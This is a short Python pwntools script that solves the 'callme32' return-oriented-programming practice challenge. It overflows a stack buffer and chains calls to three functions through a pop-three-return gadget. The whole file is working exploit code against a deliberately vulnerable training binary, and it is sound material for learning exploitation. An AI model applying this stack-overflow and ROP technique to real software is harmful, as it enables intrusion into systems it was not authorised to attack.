#!/usr/bin/env python
from pwn import *

s = process('callme32')
s.recvuntil('>')

padding = 44

elf = ELF('callme32')

callme_one_plt = elf.plt['callme_one']
callme_two_plt = elf.plt['callme_two']
callme_three_plt = elf.plt['callme_three']

print 'callme_one_plt', hex(callme_one_plt)
print 'callme_two_plt', hex(callme_two_plt)
print 'callme_three_plt', hex(callme_three_plt)

#0x080488a9 : pop esi ; pop edi ; pop ebp ; ret
pop3ret = 0x080488a9

payload = 'A' * padding
payload += p32(callme_one_plt)
payload += p32(pop3ret)    # pop the next  1,2,3 values from stack and return to callme_two
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_two_plt)
payload += p32(pop3ret)    # pop the next  1,2,3 values from stack and return to callme_three
payload += p32(1)
payload += p32(2)
payload += p32(3)
payload += p32(callme_three_plt)
payload += 'FAKE'
payload += p32(1)
payload += p32(2)
payload += p32(3)

s.sendline(payload)
s.interactive()

